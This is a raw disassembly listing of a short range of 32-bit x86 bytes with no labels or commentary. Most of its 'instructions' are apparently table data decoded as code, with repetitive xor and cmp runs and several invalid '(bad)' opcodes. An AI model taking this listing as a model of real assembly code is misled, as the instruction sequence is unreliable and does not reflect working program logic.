  4258ca:	mov    ebx,0xce35c135
  4258cf:	xor    eax,0x3758374f
  4258d4:	pop    esi
  4258d5:	aaa    
  4258d6:	jb     0x42590f
  4258d8:	jnp    0x425911
  4258da:	test   DWORD PTR [edi],esi
  4258dc:	mov    WORD PTR [edi],?
  4258de:	xchg   edx,eax
  4258df:	aaa    
  4258e0:	sahf   
  4258e1:	aaa    
  4258e2:	lods   al,BYTE PTR ds:[esi]
  4258e3:	aaa    
  4258e4:	mov    dl,0x37
  4258e6:	shl    DWORD PTR [edi],0xc8
  4258e9:	aaa    
  4258ea:	into   
  4258eb:	aaa    
  4258ec:	(bad)  [edi]
  4258ee:	call   0x127a5c2a
  4258f3:	cmp    BYTE PTR [ecx],bl
  4258f5:	cmp    BYTE PTR [edi],bl
  4258f7:	cmp    BYTE PTR [eax+edi*1],ch
  4258fa:	cmp    eax,0x49384338
  4258ff:	cmp    BYTE PTR [esi+0x38],dl
  425902:	pop    ebp
  425903:	cmp    BYTE PTR [eax+0x38],ch
  425906:	mov    BYTE PTR [eax],bh
  425908:	xchg   esp,eax
  425909:	cmp    BYTE PTR [ecx-0x43c74ec8],ah
  42590f:	cmp    dh,cl
  425911:	cmp    ch,bl
  425913:	cmp    ah,ah
  425915:	cmp    dl,ch
  425917:	cmp    bh,dh
  425919:	cmp    BYTE PTR [esi],cl
  42591b:	cmp    DWORD PTR [ecx],ebx
  42591d:	cmp    DWORD PTR [esi],esp
  42591f:	cmp    DWORD PTR [edi-0x4fc55bc6],edx
  425925:	cmp    bh,BYTE PTR [edx+edi*1+0x3ae63ac8]
  42592c:	idiv   DWORD PTR [edx]
  42592e:	(bad)  
  42592f:	cmp    al,BYTE PTR [ebx+edi*1]
  425932:	adc    DWORD PTR [ebx],edi
  425934:	and    DWORD PTR [ebx],edi
  425936:	daa    
  425937:	cmp    esi,DWORD PTR [esi]
  425939:	cmp    edi,DWORD PTR ds:0x593b483b
  42593f:	cmp    esp,DWORD PTR [eax+0x3b]
  425942:	cmp    si,WORD PTR [ebx+0x3b]
  425946:	xchg   edx,eax
  425947:	cmp    ebx,DWORD PTR [edi+0x163ba73b]
  42594d:	cmp    eax,0x3d273d20
  425952:	sub    eax,0x433d3d3d
  425957:	cmp    eax,0x3d5f3d50
  42595c:	jae    0x42599b
  42595e:	jle    0x42599d
  425960:	xchg   BYTE PTR ds:0x3d9c3d96,bh
  425966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425967:	cmp    eax,0x3dbc3daf
  42596c:	retf   
  42596d:	cmp    eax,0x3dd73dd1
  425972:	fidivr WORD PTR ds:0x3df83de9
  425978:	(bad)  
  425979:	cmp    eax,0x3e123e05
  42597e:	dec    ebx
  42597f:	ds push ecx
  425981:	ds pop esi
  425983:	ds gs add BYTE PTR ds:[eax+0x0],dl
  425989:	add    BYTE PTR [eax+0x26000000],cl
  42598f:	xor    DWORD PTR [ebx],esi
  425991:	xor    DWORD PTR [edx+0x31],eax
  425994:	dec    ecx
  425995:	xor    DWORD PTR [edi+0x31],ecx
  425998:	pop    esp
  425999:	xor    DWORD PTR [esi+0x31],ebp
  42599c:	ja     0x4259cf
  42599e:	xor    DWORD PTR [ecx],0xffffff89
  4259a1:	xor    edx,eax
  4259a3:	xor    edx,ebx
  4259a5:	xor    edx,edi
  4259a7:	xor    esp,ebp
  4259a9:	xor    esi,edi
  4259ab:	xor    eax,DWORD PTR [ebx]
  4259ad:	xor    al,0x7
  4259af:	xor    al,0x10
  4259b1:	xor    al,0x1a
  4259b3:	xor    al,0x27
  4259b5:	xor    al,0x33
  4259b7:	xor    al,0x38
  4259b9:	xor    al,0x3e
  4259bb:	xor    al,0x43
  4259bd:	xor    al,0x49
  4259bf:	xor    al,0xb6
  4259c1:	xor    eax,0x35d135be
  4259c6:	xlat   BYTE PTR ds:[ebx]
  4259c7:	xor    eax,0x386d3727
  4259cc:	jno    0x425a06
  4259ce:	jle    0x425a08
  4259d0:	mov    bh,BYTE PTR [eax]
  4259d2:	xchg   ecx,eax
  4259d3:	cmp    BYTE PTR [edi-0x53c759c8],dl
  4259d9:	cmp    BYTE PTR [edx-0x54c489c8],dh
  4259df:	cmp    al,0xb3
  4259e1:	cmp    al,0xb9
  4259e3:	cmp    al,0xbd
  4259e5:	cmp    al,0xcf
  4259e7:	cmp    al,0xdf
  4259e9:	cmp    al,0xea
  4259eb:	cmp    al,0xee
  4259ed:	cmp    al,0xf5
  4259ef:	cmp    al,0xfc
  4259f1:	cmp    al,0x6
  4259f3:	cmp    eax,0x3d2d3d13
  4259f8:	xor    edi,DWORD PTR ds:0x3d493d42
  4259fe:	dec    edi
  4259ff:	cmp    eax,0x3d613d56
  425a04:	lahf   
  425a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a07:	ds loope 0x425a49
  425a0a:	jmp    0x425a4b
  425a0c:	clc    
  425a0d:	aas    
  425a0e:	add    BYTE PTR [eax+0x0],ah
  425a11:	add    BYTE PTR [eax+0x0],bh
  425a14:	add    BYTE PTR [eax],al
  425a16:	add    al,0x30
  425a18:	or     dh,BYTE PTR [eax]
  425a1a:	adc    dh,BYTE PTR [eax]
  425a1c:	sbb    BYTE PTR [eax],dh
  425a1e:	xor    DWORD PTR [eax],esi
  425a20:	inc    edx
  425a21:	xor    BYTE PTR [edi+0x30],cl
  425a24:	pusha  
  425a25:	xor    BYTE PTR [esi+0x30],ah
  425a28:	ins    BYTE PTR es:[edi],dx
  425a29:	xor    BYTE PTR [ecx+0x30],bh
  425a2c:	mov    dh,BYTE PTR [eax]
  425a2e:	lahf   
  425a2f:	xor    BYTE PTR [edx-0x32cf41d0],dh
  425a35:	xor    dl,ah
  425a37:	xor    bh,ch
  425a39:	xor    ah,bh
  425a3b:	xor    BYTE PTR [edi],al
  425a3d:	xor    DWORD PTR [ebx],ecx
  425a3f:	xor    DWORD PTR [ebx],edx
  425a41:	xor    DWORD PTR [edi],edx
  425a43:	xor    DWORD PTR [ebx],esp
  425a45:	xor    DWORD PTR [edi],ebp
  425a47:	xor    DWORD PTR [ebx],esi
  425a49:	xor    DWORD PTR [edx],edi
  425a4b:	xor    DWORD PTR [ebx+0x31],eax
  425a4e:	dec    ecx
  425a4f:	xor    DWORD PTR [edi+0x31],ecx
  425a52:	pusha  
  425a53:	xor    DWORD PTR [ecx+esi*1+0x72],ebp
  425a57:	xor    DWORD PTR [ecx-0x72ce78cf],eax
  425a5d:	xor    DWORD PTR [ebx-0x55ce5ecf],ebx
  425a63:	xor    DWORD PTR [ecx+esi*1+0x32ee31b8],esi
  425a6a:	repnz xor bh,cl
  425a6d:	xor    bh,ch
  425a6f:	xor    al,BYTE PTR [esi]
  425a71:	xor    ecx,DWORD PTR [edx]
  425a73:	xor    edi,DWORD PTR [eax+0x35]
  425a76:	jl     0x425aad
  425a78:	dec    edx
  425a79:	cmp    eax,0x3e883d54
  425a7e:	nop
  425a7f:	ds cwde 
  425a81:	fstp   TBYTE PTR ds:[edi]
  425a84:	add    BYTE PTR [eax],al
  425a86:	add    BYTE PTR [eax+0x0],dh
  425a89:	add    BYTE PTR [eax+eax*1+0x0],ch
  425a8d:	add    BYTE PTR ds:0x7d327331,ch
  425a93:	xor    al,BYTE PTR [edx+esi*1+0x3296328a]
  425a9a:	pushf  
  425a9b:	xor    ah,BYTE PTR [edx-0x42cd50ce]
  425aa1:	xor    cl,dl
  425aa3:	xor    al,BYTE PTR [ebp+esi*1+0x5d]
  425aa7:	xor    eax,0x3589356a
  425aac:	xchg   ebp,eax
  425aad:	xor    eax,0x35a2359c
  425ab2:	scas   al,BYTE PTR es:[edi]
  425ab3:	xor    eax,0x35ba35b4
  425ab8:	int3   
  425ab9:	xor    eax,0x370f35d0
  425abe:	sbb    esi,DWORD PTR [edi]
  425ac0:	daa    
  425ac1:	aaa    
  425ac2:	sub    esi,DWORD PTR [edi]
  425ac4:	xor    esi,DWORD PTR [edi]
  425ac6:	jbe    0x425b00
  425ac8:	xchg   BYTE PTR [eax],bh
  425aca:	cwde   
  425acb:	cmp    BYTE PTR [esi-0x4ac754c8],bl
  425ad1:	cmp    BYTE PTR [eax+edi*1+0x38d638c2],bh
  425ad8:	in     al,dx
  425ad9:	cmp    dl,dh
  425adb:	cmp    BYTE PTR [edi],al
  425add:	cmp    DWORD PTR [ecx+edi*1],ecx
  425ae0:	push   ecx
  425ae1:	cmp    bl,BYTE PTR [ebx+0x3a]
  425ae4:	push   0x813a7b3a
  425ae9:	cmp    cl,BYTE PTR [esi-0x62c56ac6]
  425aef:	cmp    ah,BYTE PTR [edx+edi*1+0x8000]
  425af6:	sbb    BYTE PTR [edx],al
  425af8:	add    BYTE PTR [eax],al
  425afa:	mov    dh,0x30
  425afc:	mov    esp,0xcb30c230
  425b01:	xor    dl,dl
  425b03:	xor    ah,ch
  425b05:	xor    al,bh
  425b07:	xor    BYTE PTR [edx],al
  425b09:	xor    DWORD PTR [ecx],ecx
  425b0b:	xor    DWORD PTR [edi],ecx
  425b0d:	xor    DWORD PTR [ebx],ebx
  425b0f:	xor    DWORD PTR [ecx],esp
  425b11:	xor    DWORD PTR [edi],esp
  425b13:	xor    esp,ebp
  425b15:	xor    esi,edi
  425b17:	xor    DWORD PTR [eax],ecx
  425b19:	xor    dl,BYTE PTR ds:0x2b322532
  425b1f:	xor    bh,BYTE PTR [eax]
  425b21:	xor    bh,BYTE PTR [edi]
  425b23:	xor    al,BYTE PTR [ebp+0x32]
  425b26:	dec    esp
  425b27:	xor    bl,BYTE PTR [esi+0x33]
  425b2a:	xor    ebp,DWORD PTR fs:[esi+0x33]
  425b2e:	je     0x425b63
  425b30:	js     0x425b65
  425b32:	xor    BYTE PTR [ebx],0x90
  425b35:	xor    edx,DWORD PTR [ebx+esi*1+0x33a533a1]
  425b3c:	lods   al,BYTE PTR ds:[esi]
  425b3d:	xor    edi,DWORD PTR [ebx-0x37cc3dcd]
  425b43:	xor    edx,ebp
  425b45:	xor    esp,edi
  425b47:	xor    ebp,ebp
  425b49:	xor    edi,edx
  425b4b:	xor    eax,DWORD PTR [ecx]
  425b4d:	xor    al,0xc
  425b4f:	xor    al,0x1b
  425b51:	xor    al,0x25
  425b53:	xor    al,0x2a
  425b55:	xor    al,0x30
  425b57:	xor    al,0x36
  425b59:	xor    al,0x48
  425b5b:	xor    al,0x57
  425b5d:	xor    al,0x66
  425b5f:	xor    al,0x75
  425b61:	xor    al,0x84
  425b63:	xor    al,0x88
  425b65:	xor    al,0x98
  425b67:	xor    al,0xc7
  425b69:	xor    al,0xd0
  425b6b:	xor    al,0xdc
  425b6d:	xor    al,0xe6
  425b6f:	xor    al,0xf3
  425b71:	xor    al,0x5
  425b73:	xor    eax,0x3517350b
  425b78:	sbb    eax,0x2b352535
  425b7d:	xor    eax,0x353b3536
  425b82:	inc    ecx
  425b83:	xor    eax,0x35573550
  425b88:	pop    ebp
  425b89:	xor    eax,0x3586356a
  425b8e:	xchg   edx,eax
  425b8f:	xor    eax,0x359e3598
  425b94:	scas   al,BYTE PTR es:[edi]
  425b95:	xor    eax,0x35c735bb
  425b9a:	into   
  425b9b:	xor    eax,0x35e735d4
  425ba0:	in     eax,dx
  425ba1:	xor    eax,0x360035f3
  425ba6:	or     al,0x36
  425ba8:	adc    esi,DWORD PTR [esi]
  425baa:	sbb    DWORD PTR [esi],esi
  425bac:	sub    esi,DWORD PTR [esi]
  425bae:	xor    DWORD PTR [esi],esi
  425bb0:	ds ss inc ebp
  425bb3:	ss dec ebx
  425bb5:	ss pop eax
  425bb7:	ss fs ss push 0x36
  425bbc:	jo     0x425bf4
  425bbe:	jnp    0x425bf6
  425bc0:	xchg   DWORD PTR [esi],esi
  425bc2:	mov    esi,DWORD PTR [esi]
  425bc4:	xchg   edx,eax
  425bc5:	ss pushf 
  425bc7:	ss test eax,0xcb36c536
  425bcd:	fdiv   DWORD PTR ss:[esi]
  425bd0:	fbstp  TBYTE PTR [esi]
  425bd2:	in     eax,0x36
  425bd4:	in     al,dx
  425bd5:	div    DWORD PTR ss:[esi]
  425bd8:	add    DWORD PTR [edi],esi
  425bda:	or     BYTE PTR [edi],dh
  425bdc:	push   cs
  425bdd:	aaa    
  425bde:	and    eax,0x38372b37
  425be3:	aaa    
  425be4:	aas    
  425be5:	aaa    
  425be6:	inc    ebp
  425be7:	aaa    
  425be8:	push   edi
  425be9:	aaa    
  425bea:	pop    ebx
  425beb:	aaa    
  425bec:	data16 aaa 
  425bee:	imul   esi,DWORD PTR [edi],0x76
  425bf1:	aaa    
  425bf2:	xor    DWORD PTR [edi],0xffffffa7
  425bf5:	aaa    
  425bf6:	mov    cl,0x37
  425bf8:	mov    ebx,0xc837c237
  425bfd:	aaa    
  425bfe:	aam    0x37
  425c00:	out    0x37,eax
  425c02:	in     eax,dx
  425c03:	aaa    
  425c04:	stc    
  425c05:	aaa    
  425c06:	or     BYTE PTR [eax],bh
  425c08:	push   cs
  425c09:	cmp    BYTE PTR [eax+edi*1],dl
  425c0c:	sbb    DWORD PTR [eax],edi
  425c0e:	and    bh,BYTE PTR [eax]
  425c10:	sub    al,0x38
  425c12:	xor    bh,BYTE PTR [eax]
  425c14:	cmp    BYTE PTR ss:[esi],bh
  425c17:	cmp    BYTE PTR [edx+0x38],cl
  425c1a:	data16 cmp BYTE PTR [eax+edi*1+0x7c],ch
  425c1f:	cmp    BYTE PTR [edx-0x6cc773c8],al
  425c25:	cmp    BYTE PTR [ecx-0x48c74ec8],bl
  425c2b:	cmp    ah,al
  425c2d:	cmp    dh,cl
  425c2f:	cmp    bl,bl
  425c31:	cmp    bl,ch
  425c33:	cmp    cl,dh
  425c35:	cmp    BYTE PTR [eax],al
  425c37:	cmp    DWORD PTR [edi],eax
  425c39:	cmp    DWORD PTR ds:0x1f391439,ecx
  425c3f:	cmp    DWORD PTR [eax],esi
  425c41:	cmp    DWORD PTR [edi],esi
  425c43:	cmp    DWORD PTR ds:0x5a394a39,edi
  425c49:	cmp    DWORD PTR [eax+0x39],esp
  425c4c:	outs   dx,DWORD PTR ds:[esi]
  425c4d:	cmp    DWORD PTR [esi+0x39],esi
  425c50:	cmp    DWORD PTR [ecx],0x39ab3990
  425c56:	mov    bl,0x39
  425c58:	sar    BYTE PTR [ecx],0xd1
  425c5b:	cmp    edi,edx
  425c5d:	cmp    ebp,ebx
  425c5f:	cmp    edx,ebp
  425c61:	cmp    DWORD PTR [ecx],ecx
  425c63:	cmp    cl,BYTE PTR [edi]
  425c65:	cmp    bl,BYTE PTR [ebx]
  425c67:	cmp    ah,BYTE PTR [ecx]
  425c69:	cmp    ch,BYTE PTR [ebx]
  425c6b:	cmp    dh,BYTE PTR [ecx]
  425c6d:	cmp    al,BYTE PTR [ebx+0x3a]
  425c70:	dec    ebx
  425c71:	cmp    dl,BYTE PTR [ebp+0x3a]
  425c74:	bound  edi,QWORD PTR [edx]
  425c76:	jle    0x425cb2
  425c78:	test   BYTE PTR [edx],bh
  425c7a:	xchg   ebx,eax
  425c7b:	cmp    bl,BYTE PTR [edx-0x56c55dc6]
  425c81:	cmp    dh,BYTE PTR [edx+edi*1+0x3aca3ac3]
  425c88:	sar    BYTE PTR [edx],1
  425c8a:	fnstsw WORD PTR [edx]
  425c8c:	out    dx,eax
  425c8d:	cmp    bh,bl
  425c8f:	cmp    al,BYTE PTR [ecx]
  425c91:	cmp    ecx,DWORD PTR [ecx]
  425c93:	cmp    edi,DWORD PTR [ebx]
  425c95:	cmp    eax,DWORD PTR [ebp+0x3b]
  425c98:	dec    esp
  425c99:	cmp    edx,DWORD PTR [edx+0x3b]
  425c9c:	pop    esi
  425c9d:	cmp    esp,DWORD PTR [ebx+edi*1+0x6a]
  425ca1:	cmp    esi,DWORD PTR [edi+0x3b]
  425ca4:	jle    0x425ce1
  425ca6:	test   BYTE PTR [ebx],bh
  425ca8:	xchg   ecx,eax
  425ca9:	cmp    ebx,DWORD PTR [ecx-0x4ac45dc5]
  425caf:	cmp    edi,DWORD PTR [ebp-0x26c435c5]
  425cb5:	cmp    ebx,edi
  425cb7:	cmp    ebp,edi
  425cb9:	cmp    edi,ecx
  425cbb:	cmp    eax,DWORD PTR [eax]
  425cbd:	cmp    al,0x6
  425cbf:	cmp    al,0x21
  425cc1:	cmp    al,0x2c
  425cc3:	cmp    al,0x32
  425cc5:	cmp    al,0x38
  425cc7:	cmp    al,0x45
  425cc9:	cmp    al,0x4c
  425ccb:	cmp    al,0x52
  425ccd:	cmp    al,0x69
  425ccf:	cmp    al,0x75
  425cd1:	cmp    al,0x86
  425cd3:	cmp    al,0x8c
  425cd5:	cmp    al,0x91
  425cd7:	cmp    al,0x9d
  425cd9:	cmp    al,0xa1
  425cdb:	cmp    al,0xa9
  425cdd:	cmp    al,0xad
  425cdf:	cmp    al,0xb5
  425ce1:	cmp    al,0xcb
  425ce3:	cmp    al,0xd8
  425ce5:	cmp    al,0xe0
  425ce7:	cmp    al,0xed
  425ce9:	cmp    al,0xf3
  425ceb:	cmp    al,0x2
  425ced:	cmp    eax,0x3d153d0a
  425cf2:	sbb    DWORD PTR ds:0x3d2d3d23,edi
  425cf8:	cmp    bh,BYTE PTR ds:0x3d653d5f
  425cfe:	jno    0x425d3d
  425d00:	ja     0x425d3f
  425d02:	jg     0x425d41
  425d04:	test   DWORD PTR ds:0x3d8f,edi
  425d0a:	add    BYTE PTR [eax+0xb00000],dl
  425d10:	add    BYTE PTR [eax],al
  425d12:	cmp    al,0x30
  425d14:	xchg   ecx,eax
  425d15:	xor    al,dl
  425d17:	xor    al,bl
  425d19:	xor    ch,bl
  425d1b:	xor    BYTE PTR [ebx],cl
  425d1d:	xor    DWORD PTR [ecx+esi*1],ebx
  425d20:	xor    DWORD PTR es:[esi],ebp
  425d23:	xor    DWORD PTR [esi],edi
  425d25:	xor    DWORD PTR [ecx+0x31],ebp
  425d28:	jne    0x425d5b
  425d2a:	nop
  425d2b:	xor    DWORD PTR [edx+0x2931b531],ebx
  425d31:	xor    ch,BYTE PTR [esi]
  425d33:	xor    dh,BYTE PTR [edi+0x32]
  425d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d37:	xor    dh,BYTE PTR [eax-0x41cd4bce]
  425d3d:	xor    cl,al
  425d3f:	xor    cl,bh
  425d41:	xor    dl,ch
  425d43:	xor    ah,ah
  425d45:	xor    ch,bh
  425d47:	xor    dh,ch
  425d49:	xor    al,BYTE PTR [edx]
  425d4b:	xor    ecx,DWORD PTR [ecx]
  425d4d:	xor    ecx,DWORD PTR [edi]
  425d4f:	xor    ebx,DWORD PTR [ecx-0x4bcb59cc]
  425d55:	xor    al,0xc0
  425d57:	xor    al,0xe1
  425d59:	xor    al,0xeb
  425d5b:	xor    al,0xf2
  425d5d:	xor    al,0xf8
  425d5f:	xor    al,0x7
  425d61:	xor    eax,0x3511350c
  425d66:	pop    ss
  425d67:	xor    eax,0x352a351d
  425d6c:	ss xor eax,0x354c3545
  425d72:	push   edx
  425d73:	xor    eax,0x356b355f
  425d78:	jl     0x425daf
  425d7a:	xchg   ebp,eax
  425d7b:	xor    eax,0x35b135a2
  425d80:	(bad)  
  425d81:	xor    eax,0x35d835d4
  425d86:	cmp    BYTE PTR [edi],dh
  425d88:	inc    esp
  425d89:	aaa    
  425d8a:	push   esp
  425d8b:	aaa    
  425d8c:	pop    edi
  425d8d:	aaa    
  425d8e:	push   0x74376e37
  425d93:	aaa    
  425d94:	xor    DWORD PTR [edi],0x37933787
  425d9a:	cdq    
  425d9b:	aaa    
  425d9c:	lahf   
  425d9d:	aaa    
  425d9e:	xor    bh,BYTE PTR [ebx]
  425da0:	test   al,0x3c
  425da2:	lods   al,BYTE PTR ds:[esi]
  425da3:	cmp    al,0x23
  425da5:	xor    edi,DWORD PTR ds:[esi]
  425da8:	aas    
  425da9:	ds dec esp
  425dab:	ds push esp
  425dad:	ds fs outs dx,BYTE PTR ds:[esi]
  425db1:	ds jnp 0x425df2
  425db4:	sahf   
  425db5:	mov    ds:0x3ea93e,eax
  425dbb:	rol    BYTE PTR [eax],1
  425dbd:	add    BYTE PTR [eax],bl
  425dbf:	add    BYTE PTR [eax],al
  425dc1:	add    BYTE PTR [edi],bl
  425dc3:	cmp    ah,BYTE PTR [ebx]
  425dc5:	cmp    ah,BYTE PTR [edi]
  425dc7:	cmp    ch,BYTE PTR [ebx]
  425dc9:	cmp    ch,BYTE PTR [edi]
  425dcb:	cmp    dh,BYTE PTR [ebx]
  425dcd:	cmp    dh,BYTE PTR [edi]
  425dcf:	cmp    bh,BYTE PTR [ebx]
  425dd1:	cmp    al,BYTE PTR [eax]
  425dd3:	adc    BYTE PTR [edx],al
  425dd5:	add    BYTE PTR [eax],bl
  425dd7:	add    BYTE PTR [eax],al
  425dd9:	add    BYTE PTR [esi],al
  425ddb:	cmp    cl,BYTE PTR [edx]
  425ddd:	cmp    cl,BYTE PTR [esi]
  425ddf:	cmp    dl,BYTE PTR [edx]
  425de1:	cmp    dl,BYTE PTR [esi]
  425de3:	cmp    bl,BYTE PTR [edx]
  425de5:	cmp    bl,BYTE PTR [esi]
  425de7:	cmp    ah,BYTE PTR [edx]
  425de9:	cmp    al,BYTE PTR [eax]
  425deb:	inc    eax
  425dec:	add    al,0x0
  425dee:	push   0x18000000
  425df3:	xor    BYTE PTR [eax+esi*1],bl
  425df6:	and    BYTE PTR [eax],dh
  425df8:	mov    al,ds:0xa831a431
  425dfd:	xor    DWORD PTR [ecx+esi*1+0x31b431b0],ebp
  425e04:	mov    eax,0xc031bc31
  425e09:	xor    esp,eax
  425e0b:	xor    eax,edx
  425e0d:	xor    esp,edx
  425e0f:	xor    eax,ebx
  425e11:	xor    esp,ebx
  425e13:	xor    eax,esp
  425e15:	xor    esp,esp
  425e17:	xor    eax,ebp
  425e19:	xor    esp,ebp
  425e1b:	xor    eax,esi
  425e1d:	xor    esp,esi
  425e1f:	xor    DWORD PTR [eax],eax
  425e21:	xor    cl,BYTE PTR [edx+esi*1]
  425e24:	adc    al,0x32
  425e26:	sub    BYTE PTR [edx],dh
  425e28:	pop    esp
  425e29:	xor    ah,BYTE PTR [eax+0x32]
  425e2c:	je     0x425e60
  425e2e:	lods   al,BYTE PTR ds:[esi]
  425e2f:	xor    cl,BYTE PTR [eax+0x33]
  425e32:	sbb    BYTE PTR [eax+eiz*1],dh
  425e35:	xor    al,0x28
  425e37:	xor    al,0x2c
  425e39:	xor    al,0xd4
  425e3b:	xor    al,0xd8
  425e3d:	xor    al,0xdc
  425e3f:	xor    al,0xe0
  425e41:	xor    al,0xe4
  425e43:	xor    al,0xe8
  425e45:	xor    al,0xec
  425e47:	xor    al,0xf0
  425e49:	xor    al,0xf4
  425e4b:	xor    al,0xf8
  425e4d:	xor    al,0xfc
  425e4f:	xor    al,0x0
  425e51:	add    BYTE PTR [eax],al
  425e53:	jo     0x425e59
  425e55:	add    BYTE PTR [eax],bl
  425e57:	add    BYTE PTR [eax],al
  425e59:	add    BYTE PTR [ecx+edi*1+0x39b439b0],ch
  425e60:	mov    eax,0xc039bc39
  425e65:	cmp    esp,eax
  425e67:	cmp    eax,ecx
  425e69:	cmp    DWORD PTR [eax],eax
  425e6b:	mov    al,ds:0x180004
  425e70:	add    BYTE PTR [eax],al
  425e72:	in     al,dx
  425e73:	ss lock ss hlt 
  425e77:	ss clc 
  425e79:	ss cld 
  425e7b:	add    BYTE PTR ss:[edi],dh
  425e7e:	add    al,0x37
  425e80:	or     BYTE PTR [edi],dh
	...
